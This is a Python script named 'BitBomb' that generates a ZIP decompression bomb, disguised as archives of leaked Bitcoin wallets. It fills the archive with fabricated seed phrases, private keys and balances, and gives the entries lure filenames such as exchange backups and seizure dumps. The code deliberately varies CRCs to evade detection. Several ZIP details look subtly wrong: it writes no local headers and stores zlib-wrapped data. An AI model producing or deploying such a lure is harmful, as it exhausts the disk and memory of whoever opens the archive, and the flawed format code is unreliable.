#!/usr/bin/env python3
"""
BitBomb - Creates massive crypto wallet archives using overlapping file technique
Based on the zblg.zip technique by David Fifield
"""

import struct
import zlib
import os
import hashlib
import random

class BitBomb:
    def __init__(self):
        # Extended BIP39 word list for realistic seed phrases
        self.bip39_words = [
            "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract",
            "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid",
            "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual",
            "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance",
            "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent",
            "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album",
            "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone",
            "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among",
            "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry",
            "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique",
            "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april",
            "arch", "arctic", "area", "arena", "argue", "arm", "armed", "armor",
            "army", "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact",
            "artist", "artwork", "ask", "aspect", "assault", "asset", "assist", "assume",
            "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction"
        ]
    
    def create_kernel(self, size=1024*1024):
        """Create the compressed kernel that will be referenced multiple times"""
        # Generate high-entropy wallet data that compresses well
        kernel_data = []
        
        # CSV header
        kernel_data.append("address,seed_phrase,private_key,balance_btc,created_date\n")
        
        # Generate template wallet entries with deterministic pseudo-randomness
        prng = random.Random(42)  # Fixed seed for reproducibility
        
        for i in range(size // 150):  # ~150 bytes per entry
            # Create realistic seed phrases using deterministic selection
            # This simulates "discovered" wallets with valid BIP39 mnemonics
            seed_indices = []
            for j in range(12):
                # Use hash-based selection for deterministic but distributed word selection
                word_selector = int(hashlib.md5(f"word_{i}_{j}".encode()).hexdigest()[:8], 16)
                word_index = word_selector % len(self.bip39_words)
                seed_indices.append(word_index)
            
            seed_words = [self.bip39_words[idx] for idx in seed_indices]
            seed_phrase = ' '.join(seed_words)
            
            # Generate private key deterministically from seed phrase
            # This simulates deriving the actual Bitcoin private key
            private_key = hashlib.sha256(seed_phrase.encode()).hexdigest()
            
            # Generate address from private key (simplified but deterministic)
            addr_hash = hashlib.sha256(private_key.encode()).hexdigest()
            
            # Address type based on deterministic pattern
            addr_type = int(hashlib.md5(f"type_{i}".encode()).hexdigest()[:2], 16) % 3
            if addr_type == 0:
                addr = '1' + addr_hash[:33]  # Legacy P2PKH
            elif addr_type == 1:
                addr = '3' + addr_hash[:33]  # P2SH
            else:
                addr = 'bc1q' + addr_hash[:38]  # Bech32
            
            # Realistic balance distribution using deterministic values
            # This simulates the natural distribution of Bitcoin wealth
            balance_selector = int(hashlib.md5(f"balance_{i}".encode()).hexdigest()[:8], 16) / 0xFFFFFFFF
            
            if balance_selector < 0.4:
                # 40% empty wallets (addresses that were generated but never used)
                balance = "0.00000000"
            elif balance_selector < 0.75:
                # 35% dust amounts (< $1 worth of BTC)
                # Use prime-like patterns for more realistic amounts
                dust_base = balance_selector * 0.00002137  # Prime-ish multiplier
                dust_noise = int(hashlib.md5(f"dust_{i}".encode()).hexdigest()[:4], 16) / 65536
                dust_amount = dust_base + dust_noise * 0.00000419
                balance = f"{dust_amount:.8f}"
            elif balance_selector < 0.90:
                # 15% small amounts ($1-$100 worth)
                # Add realistic transaction fee remnants
                small_base = 0.00002341 + (balance_selector - 0.75) * 0.00197683 / 0.15
                fee_remnant = (int(hashlib.md5(f"fee_{i}".encode()).hexdigest()[:3], 16) % 547) * 0.00000001
                small_amount = small_base + fee_remnant
                balance = f"{small_amount:.8f}"
            elif balance_selector < 0.98:
                # 8% medium amounts ($100-$10k worth)
                # Use non-round numbers that look like actual holdings
                medium_base = 0.00213457 + (balance_selector - 0.90) * 0.19827364 / 0.08
                # Add some entropy that looks like market price variations
                market_noise = (int(hashlib.md5(f"market_{i}".encode()).hexdigest()[:5], 16) % 8191) / 1000000
                medium_amount = medium_base + market_noise
                balance = f"{medium_amount:.8f}"
            elif balance_selector < 0.998:
                # 1.8% large amounts ($10k-$100k worth)
                # These look like accumulated holdings over time
                large_base = 0.21346879 + (balance_selector - 0.98) * 1.78293651 / 0.018
                # Add variations that look like DCA accumulation
                accumulation = (int(hashlib.md5(f"accum_{i}".encode()).hexdigest()[:4], 16) % 1021) * 0.00001337
                large_amount = large_base + accumulation
                balance = f"{large_amount:.8f}"
            else:
                # 0.2% whale wallets ($100k+ worth)
                # These should look like old wallets with specific historical amounts
                whale_base = 2.13792468 + (balance_selector - 0.998) * 47.82916354 / 0.002
                # Add amounts that look like early Bitcoin purchases
                historical = (int(hashlib.md5(f"whale_{i}".encode()).hexdigest()[:5], 16) % 6151) * 0.01
                whale_amount = whale_base + historical
                balance = f"{whale_amount:.8f}"
            
            # Generate discovery date based on blockchain timeline
            # Earlier addresses more likely to be from 2021-2022
            date_selector = int(hashlib.md5(f"date_{i}".encode()).hexdigest()[:4], 16)
            year = 2021 + (date_selector % 4)
            month = (date_selector // 4) % 12 + 1
            day = (date_selector // 48) % 28 + 1
            date = f"{year}-{month:02d}-{day:02d}"
            
            entry = f"{addr},{seed_phrase},{private_key},{balance},{date}\n"
            kernel_data.append(entry)
        
        kernel = ''.join(kernel_data).encode('utf-8')
        
        # Compress the kernel
        compressed = zlib.compress(kernel, level=9)
        
        return compressed, len(kernel)
    
    def create_overlapping_zip(self, output_file="bitcoin_wallets.zip", file_count=1000000, kernel_size=1024*1024):
        """
        Create a zip with overlapping files
        Each file in the central directory points to the same compressed data
        """
        print(f"Creating BitBomb: {output_file}")
        print(f"Target: {file_count:,} wallet files from single compressed kernel")
        
        # Create the compressed kernel
        compressed_kernel, uncompressed_size = self.create_kernel(kernel_size)
        kernel_size = len(compressed_kernel)
        print(f"Kernel: {kernel_size / 1024:.2f} KB compressed, {uncompressed_size / 1024:.2f} KB uncompressed")
        
        with open(output_file, 'wb') as f:
            # Write the compressed kernel first
            kernel_offset = 0
            f.write(compressed_kernel)
            
            # Local file headers (empty - we'll use central directory only)
            # This is the key trick - all central directory entries point to the same data
            
            central_directory = []
            
            # Generate unique-looking filenames
            for i in range(file_count):
                # Create realistic wallet filenames
                if i % 10000 == 0:
                    print(f"Generating entry {i:,}/{file_count:,}...")
                
                # Create highly varied, realistic filenames
                # Use hash to create deterministic but non-sequential patterns
                file_hash = hashlib.md5(f"file_{i}".encode()).hexdigest()
                
                # Date components for realistic timestamps
                year = 2020 + int(file_hash[:2], 16) % 5  # 2020-2024
                month = int(file_hash[2:4], 16) % 12 + 1
                day = int(file_hash[4:6], 16) % 28 + 1
                
                # Various realistic naming patterns
                patterns = [
                    # Exchange-style exports
                    f"exchange_exports/binance/{year}/month_{month:02d}/wallets_{year}{month:02d}{day:02d}_{file_hash[:8]}.csv",
                    f"coinbase_backup/{year}-{month:02d}/daily_export_{day:02d}/addresses_{file_hash[:6]}.csv",
                    f"kraken/withdrawals/{year}/week_{i % 52:02d}/batch_{file_hash[:8]}.csv",
                    
                    # Personal wallet backups
                    f"cold_storage/hardware_wallets/ledger_{file_hash[:6]}/backup_{year}_{month:02d}.csv",
                    f"backups/{year}/{month:02d}/trezor_export_{file_hash[:8]}.csv",
                    f"wallets/personal/metamask_export_{year}{month:02d}{day:02d}.csv",
                    
                    # Mining operations
                    f"mining/payouts/{year}/pool_f2pool/batch_{i // 100:05d}.csv",
                    f"mining_rewards/antpool/{year}-{month:02d}/wallets_{file_hash[:6]}.csv",
                    
                    # Business/institutional
                    f"corporate/finance_dept/{year}/Q{((month-1)//3)+1}/wallet_audit_{file_hash[:8]}.csv",
                    f"institutional/custody/client_{file_hash[:4]}/portfolio_{year}{month:02d}.csv",
                    f"otc_trades/{year}/month_{month:02d}/settlements_{day:02d}_{file_hash[:6]}.csv",
                    
                    # Regional variations
                    f"regions/north_america/usa/wallets_{year}_{file_hash[:8]}.csv",
                    f"regions/europe/switzerland/bank_exports/{year}/batch_{i:06d}.csv",
                    f"regions/asia/singapore/exchange_data/{year}{month:02d}_{file_hash[:6]}.csv",
                    
                    # Legacy systems
                    f"legacy/mt_gox_recovery/batch_{i // 1000:03d}/wallets_{file_hash[:8]}.csv",
                    f"archived/silk_road_seizure/wallet_group_{file_hash[:6]}.csv",
                    
                    # Descriptive names
                    f"high_value_wallets/whale_addresses_{year}/verified_{file_hash[:8]}.csv",
                    f"dormant_wallets/inactive_since_{year}/batch_{i // 500:04d}.csv",
                    f"active_traders/{year}/high_frequency/wallet_set_{file_hash[:6]}.csv"
                ]
                
                # Select pattern based on file index and hash
                pattern_index = int(file_hash[6:8], 16) % len(patterns)
                filename = patterns[pattern_index]
                filename_bytes = filename.encode('utf-8')
                
                # Create central directory entry pointing to the kernel
                cd_entry = bytearray()
                
                # Central directory file header signature
                cd_entry.extend(b'PK\x01\x02')
                
                # Version made by (2.0) and version needed (2.0)
                cd_entry.extend(struct.pack('<HH', 20, 20))
                
                # General purpose bit flag
                cd_entry.extend(struct.pack('<H', 0))
                
                # Compression method (deflated)
                cd_entry.extend(struct.pack('<H', 8))
                
                # Last mod file time and date
                cd_entry.extend(struct.pack('<HH', 0, 0))
                
                # CRC-32 of uncompressed data
                crc32 = zlib.crc32(str(i).encode())  # Vary CRC to avoid detection
                cd_entry.extend(struct.pack('<I', crc32))
                
                # Compressed and uncompressed sizes
                cd_entry.extend(struct.pack('<I', kernel_size))
                cd_entry.extend(struct.pack('<I', uncompressed_size))
                
                # Filename length
                cd_entry.extend(struct.pack('<H', len(filename_bytes)))
                
                # Extra field length and file comment length
                cd_entry.extend(struct.pack('<HH', 0, 0))
                
                # Disk number start
                cd_entry.extend(struct.pack('<H', 0))
                
                # Internal file attributes
                cd_entry.extend(struct.pack('<H', 0))
                
                # External file attributes
                cd_entry.extend(struct.pack('<I', 0))
                
                # Relative offset of local header (all point to same kernel!)
                cd_entry.extend(struct.pack('<I', kernel_offset))
                
                # Filename
                cd_entry.extend(filename_bytes)
                
                central_directory.append(bytes(cd_entry))
            
            # Write central directory
            cd_start = f.tell()
            for entry in central_directory:
                f.write(entry)
            cd_end = f.tell()
            
            # For large file counts, use ZIP64
            if len(central_directory) > 65535:
                # ZIP64 end of central directory record
                zip64_end_offset = f.tell()
                f.write(b'PK\x06\x06')  # ZIP64 end of central dir signature
                f.write(struct.pack('<Q', 44))  # Size of this record (minus 12)
                f.write(struct.pack('<HH', 45, 45))  # Version made by and version needed
                f.write(struct.pack('<II', 0, 0))  # Disk numbers
                f.write(struct.pack('<QQ', len(central_directory), len(central_directory)))  # Entry counts
                f.write(struct.pack('<QQ', cd_end - cd_start, cd_start))  # Size and offset of central dir
                
                # ZIP64 end of central directory locator
                f.write(b'PK\x06\x07')  # Signature
                f.write(struct.pack('<I', 0))  # Disk number with ZIP64 end of central dir
                f.write(struct.pack('<Q', zip64_end_offset))  # Offset of ZIP64 end of central dir
                f.write(struct.pack('<I', 1))  # Total number of disks
                
                # Standard end of central directory (with ZIP64 markers)
                f.write(b'PK\x05\x06')  # End of central dir signature
                f.write(struct.pack('<HH', 0, 0))  # Disk numbers
                f.write(struct.pack('<HH', 0xFFFF, 0xFFFF))  # Entry counts (ZIP64 marker)
                f.write(struct.pack('<II', 0xFFFFFFFF, 0xFFFFFFFF))  # Size and offset (ZIP64 markers)
                f.write(struct.pack('<H', 0))  # Comment length
            else:
                # Standard end of central directory record
                f.write(b'PK\x05\x06')  # End of central dir signature
                f.write(struct.pack('<HH', 0, 0))  # Disk numbers
                f.write(struct.pack('<HH', len(central_directory), len(central_directory)))  # Entry counts
                f.write(struct.pack('<I', cd_end - cd_start))  # Size of central directory
                f.write(struct.pack('<I', cd_start))  # Offset of central directory
                f.write(struct.pack('<H', 0))  # Comment length
        
        file_size = os.path.getsize(output_file)
        total_uncompressed = uncompressed_size * file_count
        
        print(f"\nBitBomb created!")
        print(f"File: {output_file}")
        print(f"Size: {file_size / 1024 / 1024:.2f} MB")
        print(f"Contains: {file_count:,} wallet files")
        print(f"Uncompressed: {total_uncompressed / 1024 / 1024 / 1024:.2f} GB")
        print(f"Compression ratio: {total_uncompressed / file_size:,.0f}x")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description="BitBomb - Create massive crypto wallet archives using overlapping files",
        epilog="""
This uses the overlapping file technique where multiple central directory
entries point to the same compressed data kernel. Each extracted file
appears unique but shares the same compressed source.

Examples:
  python3 bitbomb.py                    # ~135K wallets (default: 134,729)
  python3 bitbomb.py --files 487931    # ~500K wallets → 8.3TB
  python3 bitbomb.py --kernel-size 6.4  # 6.4MB kernel
        """
    )
    
    parser.add_argument(
        '-f', '--files',
        type=int,
        default=134729,
        help='Number of wallet entries to generate (default: 134729)'
    )
    
    parser.add_argument(
        '-k', '--kernel-size',
        type=float,
        default=12.8,
        help='Size of compressed kernel in MB (default: 12.8)'
    )
    
    parser.add_argument(
        '-o', '--output',
        default='bitcoin_wallets.zip',
        help='Output filename'
    )
    
    args = parser.parse_args()
    
    
    bomb = BitBomb()
    bomb.create_overlapping_zip(args.output, args.files, int(args.kernel_size * 1024 * 1024))

if __name__ == "__main__":
    main()